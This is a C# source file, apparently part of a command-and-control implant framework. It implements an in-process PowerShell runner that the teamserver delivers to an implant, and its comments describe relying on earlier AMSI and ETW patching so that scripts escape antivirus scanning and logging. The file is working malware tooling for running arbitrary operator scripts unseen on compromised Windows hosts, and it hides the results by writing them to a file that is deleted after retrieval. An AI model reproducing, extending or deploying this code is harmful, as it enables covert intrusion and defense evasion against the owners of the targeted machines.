// ABR-T026 bootstrap: in-process PowerShell runner.
//
// Compiled on demand by the teamserver (in-box csc.exe, no references
// beyond mscorlib — System.Management.Automation loads from the GAC at
// runtime), delivered to the implant inside the POWERSHELL task, and
// executed through the existing CLR-hosting path (ExecuteInDefaultApp-
// Domain). The implant has already patched AMSI and ETW for the process
// (ABR-T024), so the runspace never sees a working AmsiScanBuffer and
// engine logging (script-block/module logging ride ETW) stays silent.
//
// Convention: argument is "<output-path>\n<script>"; managed exit code
// 0 = clean, 1 = script errors, 2 = hosting exception, 3 = output
// write failure. Everything the script emits lands in the output file,
// which the implant reads, returns as the task result and deletes.
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Text;

public static class Boot {
    public static int Run(string arg) {
        string[] parts = arg.Split(new char[] { '\n' }, 2);
        string outfile = parts[0];
        string script = parts.Length > 1 ? parts[1] : "";
        StringBuilder sb = new StringBuilder();
        int rc = 0;
        try {
            Assembly sma = Assembly.Load(
                "System.Management.Automation, Version=3.0.0.0, " +
                "Culture=neutral, PublicKeyToken=31bf3856ad364e35");
            Type psType = sma.GetType("System.Management.Automation.PowerShell");
            // Manual overload selection: Create/AddScript/Invoke have
            // overloads AND generic siblings with the same names, which
            // makes every binder-based lookup ambiguous.
            MethodInfo create = null, addScript = null, invoke = null;
            foreach (MethodInfo m in psType.GetMethods()) {
                if (m.IsGenericMethodDefinition) continue;
                ParameterInfo[] p = m.GetParameters();
                if (m.Name == "Create" && p.Length == 0) create = m;
                else if (m.Name == "AddScript" && p.Length == 1 && p[0].ParameterType == typeof(string)) addScript = m;
                else if (m.Name == "Invoke" && p.Length == 0) invoke = m;
            }
            if (create == null || addScript == null || invoke == null) {
                throw new Exception("PowerShell entry points not found");
            }
            object ps = create.Invoke(null, null);
            addScript.Invoke(ps, new object[] { script });
            object result = invoke.Invoke(ps, null);
            foreach (object o in (IEnumerable)result) {
                sb.AppendLine(o == null ? "" : o.ToString());
            }
            bool hadErrors = (bool)psType.GetProperty("HadErrors").GetValue(ps, null);
            if (hadErrors) {
                rc = 1;
                object streams = psType.GetProperty("Streams").GetValue(ps, null);
                object errors = streams.GetType().GetProperty("Error").GetValue(streams, null);
                foreach (object e in (IEnumerable)errors) {
                    sb.AppendLine("[ps-error] " + e);
                }
            }
        } catch (Exception e) {
            sb.AppendLine("[boot] " + e);
            rc = 2;
        }
        try {
            File.WriteAllText(outfile, sb.ToString());
        } catch {
            rc = 3;
        }
        return rc;
    }
}
